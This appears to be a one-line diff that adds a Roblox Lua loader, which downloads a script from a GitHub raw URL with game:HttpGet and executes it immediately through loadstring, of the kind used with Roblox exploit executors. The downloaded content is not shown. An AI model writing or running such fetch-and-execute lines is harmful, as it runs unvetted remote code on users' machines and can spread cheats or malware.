@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/solowef/qqgoohod/main/Script%20roblox.lua'))()
